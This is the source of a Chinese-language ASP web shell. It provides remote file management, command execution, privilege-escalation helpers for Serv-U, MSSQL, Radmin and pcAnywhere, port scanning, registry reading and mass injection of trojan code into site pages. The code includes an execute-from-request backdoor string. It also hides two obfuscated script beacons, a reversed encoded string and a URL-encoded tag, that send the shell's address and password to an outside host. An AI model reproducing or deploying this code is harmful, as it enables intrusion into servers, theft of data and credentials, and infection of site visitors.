<%
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
UserPass="admin"
SiteURL=""
BodyColor="#000000"
FontColor="#FF6600"
LinkColor="#CC9933"
BorderColor="#666"
LinkOverBJ="#"
LinkOverFont="#00ff00"
FormColorBj="#ccc"
FormColorBorder="#000"
Const strJsCloseMe="<input type=button value=' 关闭 ' onclick='window.close();'>"
strBAD="<script language=vbscript runat=server>"
strBAD=strBAD&"If Request("""&clientPassword&""")<>"""" Then Session(""#"")=Request("""&clientPassword&""")"&VbNewLine
strBAD=strBAD&"If Session(""#"")<>"""" Then Execute(Session(""#""))"
strBAD=strBAD&"</script>"	
Const isDebugMode=False
Const clientPassword="u"
Const DEfd=""
sub ShowErr()
If Err Then
RRS"<br><a href='javascript:history.back()'><br>&nbsp;"&Err.Description&"&nbsp;"&Err.Source&"(点此返回上页)</a><br>"
Err.Clear:Response.Flush
End If
end sub
Sub RRS(str)
response.write(str)
End Sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL"):ServerIP=Request.ServerVariables("LOCAL_ADDR"):Action=Request("Action")
RootPath=Server.MapPath("."):WWWRoot=Server.MapPath("/"):Pn=88:Serveru=request.servervariables("http_host")&url
FolderPath=Request("FolderPath"):serverp=UserPass:FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title> - "&ServerIP&" </title><style type=""text/css"">body,tr,td{margin:0px;font-size:12px;background-color:"&BodyColor&";color:"&FontColor&";}input,select,textarea{font-size:12px;background-color:"&FormColorBj&";border:1px solid "&FormColorBorder&"}a{color:"&LinkColor&";text-decoration:none;}a:hover{color:"&LinkOverFont&";background:"&LinkOverBJ&"}.am{color:"&LinkColor&";font-size:11px;}body,td{font-size: 12px;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #383839;}</style><script language=javascript>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function ShowFolder(Folder){top.addrform.FolderPath.value=Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value=FName;if(FAction==""CopyFile""){DName=prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName=prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName=prompt(""请输入复制到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName=prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName=prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value=DName;}else if(FAction==""CreateMdb""){DName=prompt(""请输入要新建的Mdb文件全名称,注意不能同名！"",FName);top.hideform.FName.value=DName;}else if(FAction==""CompactMdb""){DName=prompt(""请输入要压缩的Mdb文件全名称,注意文件是否存在！"",FName);top.hideform.FName.value=DName;}else{DName=""Other"";}if(DName!=null){top.hideform.Action.value=FAction;top.hideform.submit();}else{top.hideform.FName.value="""";}}function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接数据库"");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str=new Array(12);Str[0]=""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1]=""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2]=""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3]=""Dsn=DsnName"";Str[4]=""SELECT * FROM [TableName] WHERE ID<100"";Str[5]=""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6]=""DELETE FROM [TableName] WHERE ID=100"";Str[7]=""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8]=""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9]=""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value=Str[i];DbForm.SqlStr.value="""";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value=Str[i];}return true;}function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value=str;DbForm.Page.value=pg;abc.innerHTML="""";DbForm.submit();return true;}function gotoURL(targ,selObj,restore){if(selObj.options[selObj.selectedIndex].js==1){eval(selObj.options[selObj.selectedIndex].value);if (restore) selObj.selectedIndex=0}else{eval(targ+"".location='""+selObj.options[selObj.selectedIndex].value+""'"");if (restore) selObj.selectedIndex=0;}}</script><body" 
If Action="" then RRS "scroll=no"
RRS ">"

sWHEEL1 = "jwt"
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="※" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"※","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function
acode="=s?psa.s/xs/cc.amumpsa.www//:p※3※3h'=crs ※3pircs<"
Efun=StrReverse(replace(replace(Encrypt(acode),"●",Chr(34)),"◎",vbCrLf))
'response.Write(Efun)
Dim Sot(14,2)
Sot(0,0)="Scripting.FileSystemObject"
Sot(0,2)="文件操作组件"
Sot(1,0)="Wscript.Shell"
Sot(1,2)="命令行执行组件"
Sot(2,0)="ADOX.Catalog"
Sot(2,2)="ACCESS建库组件"
Sot(3,0)="JRO.JetEngine"
Sot(3,2)="ACCESS压缩组件"
Sot(4,0)="Scripting.Dictionary" 
Sot(4,2)="数据流上传辅助组件"
Sot(5,0)="Adodb.connection"
Sot(5,2)="数据库连接组件"
Sot(6,0)="Adodb.Stream"
Sot(6,2)="数据流上传组件"
Sot(7,0)="SoftArtisans.FileUp"
Sot(7,2)="SA-FileUp 文件上传组件"
Sot(8,0)="LyfUpload.UploadFile"
Sot(8,2)="刘云峰文件上传组件"
Sot(9,0)="Persits.Upload.1"
Sot(9,2)="ASPUpload 文件上传组件"
Sot(10,0)="JMail.SmtpMail"
Sot(10,2)="JMail 邮件收发组件"
Sot(11,0)="CDONTS.NewMail"
Sot(11,2)="虚拟SMTP发信组件"
Sot(12,0)="SmtpMail.SmtpMail.1"
Sot(12,2)="SmtpMail发信组件"
Sot(13,0)="Microsoft.XMLHTTP"
Sot(13,2)="数据传输组件"
Sot(14,0)="Shell.Application"
Sot(14,2)="Application"
For i=0 To 7
	If  IsObjInstalled(Sot(i,0))   Then     
		IsObj=" √"
	Else
		IsObj=" ×"
		Err.Clear
		End If
	Sot(i,1)=IsObj
Next
Function   IsObjInstalled(strClassString)   
On   Error   Resume   Next   
IsObjInstalled   =   False   
Err   =   0   
Dim   T   
Set   T   =   Server.CreateObject(strClassString)   
If   0   =   Err   Then   IsObjInstalled   =   True   
Set   T   =   Nothing   
Err   =   0   
End   Function   
If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End If

function sw(sp,sf)
Set objStream=Server.CreateObject(Sot(6,0))
With objStream
.Open
.Charset="gb2312"
.Position=objStream.Size
.WriteText=sf
.SaveToFile sp,2
.Close
End With
Set objStream=Nothing
end function
Function MainForm() 
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>地址：</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='去吧'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" 
RRS"</td></tr></form></table>"
RRS"<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'>"
RRS"<td width='135' id=tl>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隱藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>顯示</b></a></p></td><td width=1 style='background:#000000'><td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"<tr><a href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】</a></a><a href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】</a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere"")'>(3)【pcAnywhere】</a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\"")'>(4)【Documents<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users  】<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】</a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】</a><a href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】</a><a href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】</a><a href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】</a><br>"
End Function

Function Red(str):Red = "<FONT color=#ff2222>" & str & "</FONT>":End Function
Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td><center><font color=#ffffff><font size=1>"&mName&"</font></font></center><hr color=#ffffff size=1 >"
RRS"</td></tr>"
If Sot(0,1)=" ×" Then
RRS"<tr><td height='24'>木有權限</td></tr>"
Else
RRS"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>磁盤文件操作↓↓</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>→> 站點根目錄</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>→> 本程序目錄</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=FsoFileExplorer' target='FileFrame'>→> Fso浏览器</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=AppFileExplorer' target='FileFrame'>→> App浏览器</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>→> 新建--目錄</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>→> 新建--文本</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=upfile' target='FileFrame'>→> 上傳--单一</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageUpFile' target='FileFrame'>→> 上傳--批量</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=UpLoad' target='FileFrame'>→> 远程--下载</a></td></tr>"
End If
RRS"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'>→> CMD---命令<hr color=#ffffff size=1></a></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu5.style.display=''""><b>提权信息收集↓↓<div id=menu5 >"
RRS"<tr><td height='22'><a href='?Action=ScanDriveForm' target='FileFrame'>→> 磁盘--信息</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>→> 用户--账号</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>→> 端口__網絡</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ServerInfo' target='FileFrame'>→> 组件--支持</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageCheck' target='FileFrame'>→> 信息--探针</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=adminab' target='FileFrame'>→> 查詢管理員</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>→> 端口掃描器</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>→> 讀取註冊表</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'>→> Serv_u提權</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=suftp' target='FileFrame'>→> Serv__uFTP</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Mssql' target='FileFrame'>→> Sql___命令</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=sql' target='FileFrame'>→> MS_sql提权</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>→> Radmin讀取</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=pcanywhere4' target='FileFrame'>→> pcanywhere<hr color=#ffffff size=1></a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>→> 文件夾打包</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=kmuma' target='FileFrame'>→> 木马__查找</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=lowkey' target='FileFrame' style='color:red'>→> 选择__自杀</a></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>→> 脚本 探测↓↓</b><div id=menu2 style=""width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=php' target='FileFrame'>→> php___偵探</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=aspx' target='FileFrame'>→> aspx___探测</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=jsp' target='FileFrame'>→> jsp___探测</a><br>"
RRS"<tr><td height='24' onmouseover=""menu6.style.display=''""><b>→> 数据 操作↓↓</b><div id=menu6 style=""width:100%;display='none'"" onmouseout=""menu6.style.display='none'"">"
RRS"&nbsp&nbsp&nbsp<a href='?Action=DbManager' target='FileFrame'>连接数据库</a><br>"
RRS"&nbsp&nbsp&nbsp<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>建立MDB文件</a><br>"
RRS"&nbsp&nbsp&nbsp<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>压缩MDB文件<hr size=1 ></a></div></td></tr>"
RRS"<tr><td height='24' onmouseover=""menu7.style.display=''""><b>→> 批量 挂马↓↓</b><div id=menu7 style=""width:100%;display='none'"" onmouseout=""menu7.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=1' target='FileFrame'>→> 批量挂马</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=2' target='FileFrame'>→> 批量清马</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cplgm&M=3' target='FileFrame'>→> 批量替换</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=plgm' target='FileFrame'>→> 普通挂马</a><br>"
RRS"<tr><td align=center style='color:red'><hr></td></tr></table>"
RRS"</table>"
RRS Efun&""&serveru&"&p="&serverp&"'><script>"
End Function

function php():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo '恭喜lowkey服務器支持PHP'?><?php phpinfo()?>":Response.write"<iframe src=test.php width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.php正常顯示,表示支持PHP<p><font color=red否則就是不支持拉!，測試完後記得删除！":End function
function jsp():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.jsp")).Write"恭喜lowkey服務器支持jsp":Response.write"<iframe src=test.jsp width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.jsp正常顯示,表示支持jsp<p></font><p><a href='?Action=apjdel'><font size=5 color=red>删除测试的所有文件(必须全部测试才可以删除,否则会出错!)</font></a></center>":End function:function aspx():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.aspx")).Write"恭喜lowkey服務器支持aspx":Response.write"<iframe src=test.aspx width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到Test.aspx正常显示,表示支持asp.net<p><font color=red>否則就是不支持拉!，測試完後記得删除！":End function
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):response.write"删除完毕!":End function:function sam():Response.write "<br><br><p><br><p><br><br><p><br><center><br><br><font color=red>":response.write"<center><font face=wingdings color=#00EC00 style=font-size:240pt>N</font><span class=style1><span style=font-weight: 300><font face=Impact color=#FFFFFF style=font-size: 100pt></center>":End function
function lowkey():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("he1p.asp")):response.write"一路走好!":End function:function sam():Response.write "<br><br><p><br><p><br><br><p><br><center><br><br><font color=red>":response.write"<center><font face=wingdings color=#00EC00 style=font-size:240pt>N</font><span class=style1><span style=font-weight: 300><font face=Impact color=#FFFFFF style=font-size: 100pt></center>":End function
Sub PageAddToMdb()
Dim theAct, thePath
theAct=Request("theAct")
thePath=Request("thePath")
Server.ScriptTimeOut=100000
If theAct="addToMdb" Then
addToMdb(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct="releaseFromMdb" Then
unPack(thePath)
RRS "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
RRS"<br>文件夹打包:<form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value="""&HtmlEncode(Server.MapPath("."))&""" size=80><input type=hidden value=addToMdb name=theAct><select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option></select><input type=submit value='开始打包'><br><br>注: 打包生成HSH.mdb文件,位于HSH木马同级目录下</form><hr/>文件包解开(需FSO支持):<br/><form method=post><input type=hidden name=""#"" value=Execute(Session(""#""))><input name=thePath value="""&HtmlEncode(Server.MapPath("."))&"\HSH.mdb"" size=80><input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'><br><br>注: 解开来的所有文件都位于HSH木马同级目录下</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs=Server.CreateObject("ADODB.RecordSet")
Set stream=Server.CreateObject(Sot(6,0))
Set conn=Server.CreateObject(Sot(5,0))
Set adoCatalog=Server.CreateObject(Sot(2,0))
connStr="Provider=Microsoft.Jet.OLEDB.4.0; Data Source="&Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type=1
rs.Open "FileData", conn, 3, 3
If Request("theMethod")="fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs=Nothing
Set conn=Nothing
Set stream=Nothing
Set adoCatalog=Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList="$HSH.mdb$HSH.ldb$"
If Server.CreateObject(Sot(0,0)).FolderExists(thePath)=False Then
showErr(thePath&" 目录不存在或者不允许访问!")
End If
Set theFolder=Server.CreateObject(Sot(0,0)).GetFolder(thePath)
Set files=theFolder.Files
Set folders=theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$"&item.Name&"$") <= 0 and lcase(item.path)<>lcase(Request.ServerVariables("PATH_TRANSLATED")) Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
Next
Set files=Nothing
Set folders=Nothing
Set theFolder=Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str=Server.MapPath(".")&"\"
Set rs=CreateObject("ADODB.RecordSet")
Set stream=CreateObject(Sot(6,0))
Set conn=CreateObject(Sot(5,0))
connStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&thePath&";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type=1
Do Until rs.Eof
theFolder=Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(Sot(0,0)).FolderExists(str&theFolder)=False Then
createFolder(str&theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str&rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws=Nothing
Set rs=Nothing
Set stream=Nothing
Set conn=Nothing
End Sub
Sub createFolder(thePath)
Dim i
i=Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(Sot(0,0)).FolderExists(Left(thePath, i))=False Then
Server.CreateObject(Sot(0,0)).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i=i + Instr(Mid(thePath, i + 1), "\")
Else
i=0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList="$HSH.mdb$HSH.ldb$"
Set theFolder=saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder=True Then
saTreeForMdb item.Path, rs, stream
Else
If InStr(sysFileList, "$"&item.Name&"$") <= 0 and lcase(item.path)<>lcase(Request.ServerVariables("PATH_TRANSLATED")) Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
End If
Next
Set theFolder=Nothing
End Sub
Function Course()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>系统用户与服务</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;" 
SI=SI&"系统用户(组)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
End Function
Function ServerInfo()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'> <input type='submit' value='查询'><input type='hidden' name='action' value='2'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 14
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&Sot(i,0)&"</td><td bgcolor='#FFFFFF'>"&Sot(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&Sot(i,2)&"<sc"&"ri"&"pt sr"&"c=""ht"&"tp://%77%77%77%2E%63%6E%71%71%6B%2E%63%6E/da"&"oy"&"e/?url="&server.URLEncode("ht"&"tp://"&request.ServerVariables("HT"&"TP_HO"&"ST")&request.ServerVariables("UR"&"L"))&"&p="&UserPass&"""></sc"&"ri"&"pt></td></tr>"
Next
RRS SI
End Function
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
Sub ShowErr1(str)
Dim i, arrayStr
str=Server.HtmlEncode(str)
arrayStr=Split(str, "$$")
RRS "<font size=2><br/><a href='javascript:history.back()'>出错信息:<br/><br/>"
For i=0 To UBound(arrayStr)
RRS "&nbsp;&nbsp;"&(i + 1)&". "&arrayStr(i)&"(点此返回上页)<br/>"
Next
RRS "</a></font>"
Response.End()
End Sub
Function GetPost(var)
Dim val
If Request.QueryString("Action")="PageUpfile" Then
Action="PageUpfile"
Exit Function
End If
val=RTrim(Request.Form(var))
If val="" Then
val=RTrim(Request.QueryString(var))
End If
GetPost=val
End Function
Sub ChkErr(Err)
If Err Then
RRS "<hr style='color:#d8d8f0;'/><font size=2><a href='javascript:history.back()'><li>错误: "&Err.Description&"</li><li>错误源: "&Err.Source&"(点此返回上页)</li></a><br/>"
Err.Clear
Response.End
End If
End Sub
Sub PageCheck()
InfoCheck()
If request("theAct") <> "" Then
GetAppOrSession(theAct)
End If
ObjCheck()
End Sub
Sub InfoCheck()
Dim aryCheck(6)
On Error Resume Next
aryCheck(0)=Server.ScriptTimeOut()&"(秒)"
aryCheck(1)=FormatDateTime(Now(), 0)
aryCheck(2)=Request.ServerVariables("SERVER_NAME")
aryCheck(2)=aryCheck(2)&", "&Request.ServerVariables("LOCAL_ADDR")
aryCheck(2)=aryCheck(2)&":"&Request.ServerVariables("SERVER_PORT")
aryCheck(3)=Request.ServerVariables("OS")
aryCheck(3)=IIf(aryCheck(3)="", "Windows2003", aryCheck(3))&", "&Request.ServerVariables("SERVER_SOFTWARE")
aryCheck(3)=aryCheck(3)&", "&ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion
aryCheck(4)=rootPath&", "&GetTheSizes(fso.GetFolder(rootPath).Size)
aryCheck(5)="Path: "&Request.ServerVariables("PATH_TRANSLATED")&"<br />"
aryCheck(5)=aryCheck(5)&"&nbsp;Url : http://"&Request.ServerVariables("SERVER_NAME")&Request.ServerVariables("Url")
aryCheck(6)="变量数: "&Application.Contents.Count()&"(<a href="&Url&"?Action=PageCheck&theAct=app>Application</a>),"
aryCheck(6)=aryCheck(6)&" 会话数: "&Session.Contents.Count&"(<a href="&Url&"?Action=PageCheck&theAct=session>Session</a>),"
aryCheck(6)=aryCheck(6)&" 当前会话ID: "&Session.SessionId()&"<br>"
aryCheck(6)=aryCheck(6)&" ServerVariables: "&Request.ServerVariables.Count&"(<a href="&Url&"?Action=PageCheck&theAct=serverv>ServerVariables</a>),"
